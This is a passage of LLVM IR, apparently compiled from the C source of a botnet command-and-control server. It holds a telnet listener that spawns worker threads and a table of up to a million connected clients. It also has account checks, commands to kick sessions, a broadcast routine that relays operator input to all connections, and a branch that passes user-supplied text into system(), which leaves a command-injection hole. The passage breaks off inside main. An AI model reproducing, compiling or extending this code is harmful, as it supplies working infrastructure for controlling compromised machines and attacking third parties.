  %710 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %711 = call i8* @strstr(i8* noundef %710, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i64 0, i64 0)) #9
  %712 = icmp ne i8* %711, null
  br i1 %712, label %713, label %774

713:                                              ; preds = %709, %705
  %714 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %715 = call i8* @strtok(i8* noundef %714, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i64 0, i64 0)) #11
  store i8* %715, i8** %37, align 8
  %716 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i64 0, i64 0
  %717 = load i8*, i8** %37, align 8
  %718 = load i8*, i8** %37, align 8
  %719 = call i64 @strlen(i8* noundef %718) #9
  %720 = getelementptr inbounds i8, i8* %717, i64 %719
  %721 = getelementptr inbounds i8, i8* %720, i64 1
  %722 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* noundef %716, i64 noundef 20, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.29, i64 0, i64 0), i8* noundef %721) #11
  %723 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i64 0, i64 0
  call void @trim(i8* noundef %723)
  store i32 0, i32* %35, align 4
  br label %724

724:                                              ; preds = %770, %713
  %725 = load i32, i32* %35, align 4
  %726 = icmp slt i32 %725, 1000000
  br i1 %726, label %727, label %773

727:                                              ; preds = %724
  %728 = load i32, i32* %35, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %729
  %731 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %730, i32 0, i32 2
  %732 = getelementptr inbounds [20 x i8], [20 x i8]* %731, i64 0, i64 0
  %733 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i64 0, i64 0
  %734 = call i8* @strstr(i8* noundef %732, i8* noundef %733) #9
  %735 = icmp ne i8* %734, null
  br i1 %735, label %736, label %769

736:                                              ; preds = %727
  %737 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %738 = load i32, i32* %4, align 4
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %739
  %741 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %740, i32 0, i32 2
  %742 = getelementptr inbounds [20 x i8], [20 x i8]* %741, i64 0, i64 0
  %743 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %737, i8* noundef getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i64 0, i64 0), i8* noundef %742) #11
  %744 = load i32, i32* %35, align 4
  %745 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %746 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %747 = call i64 @strlen(i8* noundef %746) #9
  %748 = call i64 @send(i32 noundef %744, i8* noundef %745, i64 noundef %747, i32 noundef 16384)
  %749 = icmp eq i64 %748, -1
  br i1 %749, label %750, label %751

750:                                              ; preds = %736
  store i8* null, i8** %2, align 8
  br label %969

751:                                              ; preds = %736
  %752 = load i32, i32* %35, align 4
  %753 = sext i32 %752 to i64
  %754 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %753
  %755 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %754, i32 0, i32 1
  store i32 0, i32* %755, align 4
  %756 = load i32, i32* %35, align 4
  %757 = call i32 @close(i32 noundef %756)
  %758 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %759 = getelementptr inbounds [20 x i8], [20 x i8]* %36, i64 0, i64 0
  %760 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %758, i8* noundef getelementptr inbounds ([30 x i8], [30 x i8]* @.str.83, i64 0, i64 0), i8* noundef %759) #11
  %761 = load i32, i32* %4, align 4
  %762 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %763 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %764 = call i64 @strlen(i8* noundef %763) #9
  %765 = call i64 @send(i32 noundef %761, i8* noundef %762, i64 noundef %764, i32 noundef 16384)
  %766 = icmp eq i64 %765, -1
  br i1 %766, label %767, label %768

767:                                              ; preds = %751
  store i8* null, i8** %2, align 8
  br label %969

768:                                              ; preds = %751
  br label %769

769:                                              ; preds = %768, %727
  br label %770

770:                                              ; preds = %769
  %771 = load i32, i32* %35, align 4
  %772 = add nsw i32 %771, 1
  store i32 %772, i32* %35, align 4
  br label %724, !llvm.loop !27

773:                                              ; preds = %724
  br label %824

774:                                              ; preds = %709
  %775 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %776 = call i8* @strstr(i8* noundef %775, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i64 0, i64 0)) #9
  %777 = icmp ne i8* %776, null
  br i1 %777, label %782, label %778

778:                                              ; preds = %774
  %779 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %780 = call i8* @strstr(i8* noundef %779, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i64 0, i64 0)) #9
  %781 = icmp ne i8* %780, null
  br i1 %781, label %782, label %823

782:                                              ; preds = %778, %774
  %783 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %784 = call i8* @strtok(i8* noundef %783, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i64 0, i64 0)) #11
  store i8* %784, i8** %38, align 8
  %785 = load i8*, i8** %38, align 8
  %786 = load i8*, i8** %38, align 8
  %787 = call i64 @strlen(i8* noundef %786) #9
  %788 = getelementptr inbounds i8, i8* %785, i64 %787
  %789 = getelementptr inbounds i8, i8* %788, i64 1
  %790 = call i32 @atoi(i8* noundef %789) #9
  store i32 %790, i32* %39, align 4
  %791 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %792 = load i32, i32* %4, align 4
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %793
  %795 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %794, i32 0, i32 2
  %796 = getelementptr inbounds [20 x i8], [20 x i8]* %795, i64 0, i64 0
  %797 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %791, i8* noundef getelementptr inbounds ([43 x i8], [43 x i8]* @.str.82, i64 0, i64 0), i8* noundef %796) #11
  %798 = load i32, i32* %39, align 4
  %799 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %800 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %801 = call i64 @strlen(i8* noundef %800) #9
  %802 = call i64 @send(i32 noundef %798, i8* noundef %799, i64 noundef %801, i32 noundef 16384)
  %803 = icmp eq i64 %802, -1
  br i1 %803, label %804, label %805

804:                                              ; preds = %782
  store i8* null, i8** %2, align 8
  br label %969

805:                                              ; preds = %782
  %806 = load i32, i32* %39, align 4
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %807
  %809 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %808, i32 0, i32 1
  store i32 0, i32* %809, align 4
  %810 = load i32, i32* %39, align 4
  %811 = call i32 @close(i32 noundef %810)
  %812 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %813 = load i32, i32* %39, align 4
  %814 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %812, i8* noundef getelementptr inbounds ([46 x i8], [46 x i8]* @.str.86, i64 0, i64 0), i32 noundef %813) #11
  %815 = load i32, i32* %4, align 4
  %816 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %817 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %818 = call i64 @strlen(i8* noundef %817) #9
  %819 = call i64 @send(i32 noundef %815, i8* noundef %816, i64 noundef %818, i32 noundef 16384)
  %820 = icmp eq i64 %819, -1
  br i1 %820, label %821, label %822

821:                                              ; preds = %805
  store i8* null, i8** %2, align 8
  br label %969

822:                                              ; preds = %805
  br label %823

823:                                              ; preds = %822, %778
  br label %824

824:                                              ; preds = %823, %773
  br label %836

825:                                              ; preds = %696
  %826 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %827 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %826, i8* noundef getelementptr inbounds ([53 x i8], [53 x i8]* @.str.87, i64 0, i64 0)) #11
  %828 = load i32, i32* %4, align 4
  %829 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %830 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %831 = call i64 @strlen(i8* noundef %830) #9
  %832 = call i64 @send(i32 noundef %828, i8* noundef %829, i64 noundef %831, i32 noundef 16384)
  %833 = icmp eq i64 %832, -1
  br i1 %833, label %834, label %835

834:                                              ; preds = %825
  br label %835

835:                                              ; preds = %834, %825
  br label %836

836:                                              ; preds = %835, %824
  br label %837

837:                                              ; preds = %836, %683
  %838 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %839 = call i8* @strstr(i8* noundef %838, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i64 0, i64 0)) #9
  %840 = icmp ne i8* %839, null
  br i1 %840, label %841, label %910

841:                                              ; preds = %837
  %842 = load i8*, i8** %12, align 8
  %843 = load i32, i32* %5, align 4
  %844 = sext i32 %843 to i64
  %845 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %844
  %846 = getelementptr inbounds %struct.account, %struct.account* %845, i32 0, i32 2
  %847 = getelementptr inbounds [200 x i8], [200 x i8]* %846, i64 0, i64 0
  %848 = call i32 @strcmp(i8* noundef %842, i8* noundef %847) #9
  %849 = icmp eq i32 %848, 0
  br i1 %849, label %859, label %850

850:                                              ; preds = %841
  %851 = load i8*, i8** %13, align 8
  %852 = load i32, i32* %5, align 4
  %853 = sext i32 %852 to i64
  %854 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %853
  %855 = getelementptr inbounds %struct.account, %struct.account* %854, i32 0, i32 2
  %856 = getelementptr inbounds [200 x i8], [200 x i8]* %855, i64 0, i64 0
  %857 = call i32 @strcmp(i8* noundef %851, i8* noundef %856) #9
  %858 = icmp eq i32 %857, 0
  br i1 %858, label %859, label %898

859:                                              ; preds = %850, %841
  %860 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %861 = call i8* @strtok(i8* noundef %860, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i64 0, i64 0)) #11
  store i8* %861, i8** %40, align 8
  %862 = load i8*, i8** %40, align 8
  %863 = getelementptr inbounds i8, i8* %862, i64 8
  store i8* %863, i8** %41, align 8
  %864 = load i8*, i8** %41, align 8
  call void @trim(i8* noundef %864)
  %865 = getelementptr inbounds [50 x i8*], [50 x i8*]* %42, i64 0, i64 0
  %866 = bitcast i8** %865 to i8*
  %867 = load i8*, i8** %41, align 8
  %868 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %866, i8* noundef getelementptr inbounds ([24 x i8], [24 x i8]* @.str.89, i64 0, i64 0), i8* noundef %867) #11
  %869 = getelementptr inbounds [50 x i8*], [50 x i8*]* %42, i64 0, i64 0
  %870 = bitcast i8** %869 to i8*
  %871 = call i32 @system(i8* noundef %870)
  %872 = load i32, i32* %5, align 4
  %873 = sext i32 %872 to i64
  %874 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %873
  %875 = getelementptr inbounds %struct.account, %struct.account* %874, i32 0, i32 0
  %876 = getelementptr inbounds [200 x i8], [200 x i8]* %875, i64 0, i64 0
  %877 = load i8*, i8** %41, align 8
  %878 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i64 0, i64 0), i8* noundef %876, i8* noundef %877)
  %879 = load i32, i32* %4, align 4
  %880 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %881 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %882 = call i64 @strlen(i8* noundef %881) #9
  %883 = call i64 @send(i32 noundef %879, i8* noundef %880, i64 noundef %882, i32 noundef 16384)
  %884 = icmp eq i64 %883, -1
  br i1 %884, label %885, label %886

885:                                              ; preds = %859
  store i8* null, i8** %2, align 8
  br label %969

886:                                              ; preds = %859
  %887 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %887, %struct._IO_FILE** %43, align 8
  %888 = load %struct._IO_FILE*, %struct._IO_FILE** %43, align 8
  %889 = load i32, i32* %5, align 4
  %890 = sext i32 %889 to i64
  %891 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %890
  %892 = getelementptr inbounds %struct.account, %struct.account* %891, i32 0, i32 0
  %893 = getelementptr inbounds [200 x i8], [200 x i8]* %892, i64 0, i64 0
  %894 = load i8*, i8** %41, align 8
  %895 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %888, i8* noundef getelementptr inbounds ([33 x i8], [33 x i8]* @.str.90, i64 0, i64 0), i8* noundef %893, i8* noundef %894)
  %896 = load %struct._IO_FILE*, %struct._IO_FILE** %43, align 8
  %897 = call i32 @fclose(%struct._IO_FILE* noundef %896)
  br label %909

898:                                              ; preds = %850
  %899 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %900 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %899, i8* noundef getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i64 0, i64 0)) #11
  %901 = load i32, i32* %4, align 4
  %902 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %903 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %904 = call i64 @strlen(i8* noundef %903) #9
  %905 = call i64 @send(i32 noundef %901, i8* noundef %902, i64 noundef %904, i32 noundef 16384)
  %906 = icmp eq i64 %905, -1
  br i1 %906, label %907, label %908

907:                                              ; preds = %898
  br label %908

908:                                              ; preds = %907, %898
  br label %909

909:                                              ; preds = %908, %886
  br label %910

910:                                              ; preds = %909, %837
  %911 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %912 = call i8* @strstr(i8* noundef %911, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.91, i64 0, i64 0)) #9
  %913 = icmp ne i8* %912, null
  br i1 %913, label %914, label %915

914:                                              ; preds = %910
  br label %960

915:                                              ; preds = %910
  %916 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @trim(i8* noundef %916)
  %917 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %918 = load i32, i32* %5, align 4
  %919 = sext i32 %918 to i64
  %920 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %919
  %921 = getelementptr inbounds %struct.account, %struct.account* %920, i32 0, i32 0
  %922 = getelementptr inbounds [200 x i8], [200 x i8]* %921, i64 0, i64 0
  %923 = call i32 (i8*, i8*, ...) @sprintf(i8* noundef %917, i8* noundef getelementptr inbounds ([43 x i8], [43 x i8]* @.str.37, i64 0, i64 0), i8* noundef %922) #11
  %924 = load i32, i32* %4, align 4
  %925 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %926 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %927 = call i64 @strlen(i8* noundef %926) #9
  %928 = call i64 @send(i32 noundef %924, i8* noundef %925, i64 noundef %927, i32 noundef 16384)
  %929 = icmp eq i64 %928, -1
  br i1 %929, label %930, label %931

930:                                              ; preds = %915
  br label %960

931:                                              ; preds = %915
  %932 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %933 = call i64 @strlen(i8* noundef %932) #9
  %934 = icmp eq i64 %933, 0
  br i1 %934, label %935, label %936

935:                                              ; preds = %931
  br label %224, !llvm.loop !28

936:                                              ; preds = %931
  %937 = load i32, i32* %5, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %938
  %940 = getelementptr inbounds %struct.account, %struct.account* %939, i32 0, i32 0
  %941 = getelementptr inbounds [200 x i8], [200 x i8]* %940, i64 0, i64 0
  %942 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %943 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i64 0, i64 0), i8* noundef %941, i8* noundef %942)
  %944 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.93, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %944, %struct._IO_FILE** %44, align 8
  %945 = load %struct._IO_FILE*, %struct._IO_FILE** %44, align 8
  %946 = load i32, i32* %5, align 4
  %947 = sext i32 %946 to i64
  %948 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %947
  %949 = getelementptr inbounds %struct.account, %struct.account* %948, i32 0, i32 0
  %950 = getelementptr inbounds [200 x i8], [200 x i8]* %949, i64 0, i64 0
  %951 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %952 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %945, i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i64 0, i64 0), i8* noundef %950, i8* noundef %951)
  %953 = load %struct._IO_FILE*, %struct._IO_FILE** %44, align 8
  %954 = call i32 @fclose(%struct._IO_FILE* noundef %953)
  %955 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %956 = load i32, i32* %4, align 4
  %957 = getelementptr inbounds [80 x i8], [80 x i8]* %10, i64 0, i64 0
  call void @broadcast(i8* noundef %955, i32 noundef %956, i8* noundef %957)
  %958 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %958, i8 0, i64 2048, i1 false)
  br label %224, !llvm.loop !28

959:                                              ; preds = %224
  br label %960

960:                                              ; preds = %959, %930, %914, %596, %549, %303, %286, %205, %190, %179, %178, %159, %153, %119, %113, %103, %96
  %961 = load i32, i32* %4, align 4
  %962 = sext i32 %961 to i64
  %963 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %962
  %964 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %963, i32 0, i32 1
  store i32 0, i32* %964, align 4
  %965 = load i32, i32* %4, align 4
  %966 = call i32 @close(i32 noundef %965)
  %967 = load volatile i32, i32* @managesConnected, align 4
  %968 = add nsw i32 %967, -1
  store volatile i32 %968, i32* @managesConnected, align 4
  br label %969

969:                                              ; preds = %960, %885, %821, %804, %767, %750, %664, %629
  %970 = load i8*, i8** %2, align 8
  ret i8* %970
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE* noundef) #4

declare i32 @fgetc(%struct._IO_FILE* noundef) #1

declare void @rewind(%struct._IO_FILE* noundef) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE* noundef, i8* noundef, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64* noundef, %union.pthread_attr_t* noundef, i8* (i8*)* noundef, i8* noundef) #4

; Function Attrs: nounwind
declare i8* @strtok(i8* noundef, i8* noundef) #4

; Function Attrs: nounwind
declare i32 @snprintf(i8* noundef, i64 noundef, i8* noundef, ...) #4

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8* noundef) #2

declare i32 @system(i8* noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @telnetListener(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct._IO_FILE*, align 8
  %9 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %10 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #11
  store i32 %10, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 0
  br i1 %12, label %13, label %14

13:                                               ; preds = %1
  call void @perror(i8* noundef getelementptr inbounds ([21 x i8], [21 x i8]* @.str.94, i64 0, i64 0))
  br label %14

14:                                               ; preds = %13, %1
  %15 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %15, i8 0, i64 16, i1 false)
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %18 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 0, i32* %18, align 4
  %19 = load i32, i32* %2, align 4
  %20 = trunc i32 %19 to i16
  %21 = call zeroext i16 @htons(i16 noundef zeroext %20) #10
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %21, i16* %22, align 2
  %23 = load i32, i32* %3, align 4
  %24 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %25 = call i32 @bind(i32 noundef %23, %struct.sockaddr* noundef %24, i32 noundef 16) #11
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %28

27:                                               ; preds = %14
  call void @perror(i8* noundef getelementptr inbounds ([17 x i8], [17 x i8]* @.str.95, i64 0, i64 0))
  br label %28

28:                                               ; preds = %27, %14
  %29 = load i32, i32* %3, align 4
  %30 = call i32 @listen(i32 noundef %29, i32 noundef 5) #11
  store i32 16, i32* %5, align 4
  br label %31

31:                                               ; preds = %68, %28
  %32 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([26 x i8], [26 x i8]* @.str.96, i64 0, i64 0))
  %33 = bitcast %struct.sockaddr_in* %7 to { i64, i64 }*
  %34 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %33, i32 0, i32 0
  %35 = load i64, i64* %34, align 4
  %36 = getelementptr inbounds { i64, i64 }, { i64, i64 }* %33, i32 0, i32 1
  %37 = load i64, i64* %36, align 4
  call void @client_addr(i64 %35, i64 %37)
  %38 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  store %struct._IO_FILE* %38, %struct._IO_FILE** %8, align 8
  %39 = load %struct._IO_FILE*, %struct._IO_FILE** %8, align 8
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %41 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %40, i32 0, i32 0
  %42 = load i32, i32* %41, align 4
  %43 = and i32 %42, 255
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %45 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 4
  %47 = and i32 %46, 65280
  %48 = lshr i32 %47, 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %50 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %49, i32 0, i32 0
  %51 = load i32, i32* %50, align 4
  %52 = and i32 %51, 16711680
  %53 = lshr i32 %52, 16
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  %57 = and i32 %56, -16777216
  %58 = lshr i32 %57, 24
  %59 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %39, i8* noundef getelementptr inbounds ([39 x i8], [39 x i8]* @.str.97, i64 0, i64 0), i32 noundef %43, i32 noundef %48, i32 noundef %53, i32 noundef %58)
  %60 = load %struct._IO_FILE*, %struct._IO_FILE** %8, align 8
  %61 = call i32 @fclose(%struct._IO_FILE* noundef %60)
  %62 = load i32, i32* %3, align 4
  %63 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %64 = call i32 @accept(i32 noundef %62, %struct.sockaddr* noundef %63, i32* noundef %5)
  store i32 %64, i32* %4, align 4
  %65 = load i32, i32* %4, align 4
  %66 = icmp slt i32 %65, 0
  br i1 %66, label %67, label %68

67:                                               ; preds = %31
  call void @perror(i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.98, i64 0, i64 0))
  br label %68

68:                                               ; preds = %67, %31
  %69 = load i32, i32* %4, align 4
  %70 = sext i32 %69 to i64
  %71 = inttoptr i64 %70 to i8*
  %72 = call i32 @pthread_create(i64* noundef %9, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef @telnetWorker, i8* noundef %71) #11
  br label %31
}

; Function Attrs: nounwind
declare i32 @socket(i32 noundef, i32 noundef, i32 noundef) #4

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 noundef zeroext) #3

; Function Attrs: nounwind
declare i32 @bind(i32 noundef, %struct.sockaddr* noundef, i32 noundef) #4

; Function Attrs: nounwind
declare i32 @listen(i32 noundef, i32 noundef) #4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @main(i32 noundef %0, i8** noundef %1, i8** noundef %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca [20 x i8], align 16
  %13 = alloca [20 x i8], align 16
  %14 = alloca i8*, align 8
  %15 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %16 = call void (i32)* @signal(i32 noundef 13, void (i32)* noundef inttoptr (i64 1 to void (i32)*)) #11
  %17 = load i32, i32* %5, align 4
  %18 = icmp ne i32 %17, 4
  br i1 %18, label %19, label %25

19:                                               ; preds = %3
  %20 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %21 = load i8**, i8*** %6, align 8
  %22 = getelementptr inbounds i8*, i8** %21, i64 0
  %23 = load i8*, i8** %22, align 8
  %24 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %20, i8* noundef getelementptr inbounds ([46 x i8], [46 x i8]* @.str.99, i64 0, i64 0), i8* noundef %23)
  call void @exit(i32 noundef 1) #12
  unreachable

25:                                               ; preds = %3
  %26 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.100, i64 0, i64 0), i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i64 0, i64 0))
  store %struct._IO_FILE* %26, %struct._IO_FILE** @fileFD, align 8
  %27 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.102, i64 0, i64 0), i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i64 0, i64 0))
  store %struct._IO_FILE* %27, %struct._IO_FILE** @kfileFD, align 8
  %28 = load i8**, i8*** %6, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 3
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* noundef %30) #9
  store i32 %31, i32* %10, align 4
  %32 = load i8**, i8*** %6, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 2
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @atoi(i8* noundef %34) #9
  store i32 %35, i32* %9, align 4
  %36 = load i32, i32* %9, align 4
  %37 = icmp sgt i32 %36, 850
  br i1 %37, label %38, label %40

38:                                               ; preds = %25
  %39 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([31 x i8], [31 x i8]* @.str.103, i64 0, i64 0))
  ret i32 0

40:                                               ; preds = %25
  %41 = load i32, i32* %10, align 4
  %42 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([33 x i8], [33 x i8]* @.str.104, i64 0, i64 0), i32 noundef %41)
  %43 = load i8**, i8*** %6, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 1
